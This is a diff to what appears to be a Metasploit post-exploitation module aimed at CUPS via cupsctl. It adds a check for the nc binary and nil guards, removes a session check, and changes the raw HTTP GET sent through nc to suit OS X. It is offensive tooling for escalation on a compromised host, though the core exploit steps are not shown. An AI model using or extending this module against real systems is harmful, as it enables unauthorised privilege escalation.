@@ -70,12 +70,22 @@ class Metasploit3 < Msf::Post
 		if ctl_path.blank?
 			print_error "cupsctl binary not found in $PATH"
 			return Msf::Exploit::CheckCode::Safe
+		else
+			print_good "cupsctl binary found in $PATH"
+		end
+
+		nc_path = whereis("nc")
+		if nc_path.nil? or nc_path.blank?
+			print_error "Could not find nc executable"
+			return Msf::Exploit::CheckCode::Unknown
+		else
+			print_good "nc binary found in $PATH"
 		end
 
 		config_path = whereis("cups-config")
 		config_vn = nil
 
-		if config_path.blank?
+		if config_path.nil? or config_path.blank?
 			# cups-config not present, ask the web interface what vn it is
 			output = get_request('/')
 			if output =~ /title.*CUPS\s+([\d\.]+)/i
@@ -99,11 +109,6 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		if session.nil?
-			print_error "Invalid session."
-			return
-		end
-
 		if check_exploitability == Msf::Exploit::CheckCode::Safe
 			print_error "Target machine not vulnerable, bailing."
 			return
@@ -141,7 +146,7 @@ class Metasploit3 < Msf::Post
 
 	def whereis(exe)
 		line = cmd_exec("whereis #{exe}")
-		if line =~ /^\S+:\s*(\S+)/i
+		if line =~ /^\S+:\s*(\S*)/i
 			$1 # on ubuntu whereis returns "cupsctl: /usr/sbin/cupsctl"
 		else
 			line # on osx it just returns '/usr/sbin/cupsctl'
@@ -159,6 +164,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def perform_request(uri, nc_str)
-		cmd_exec(['printf', "GET #{uri}\n\r\n\r".inspect, '|', nc_str].join(' '))
+		# osx requires 3 newlines!
+		cmd_exec(['printf', "GET #{uri}\r\n\r\n\r\n".inspect, '|', nc_str].join(' '))
 	end
 end
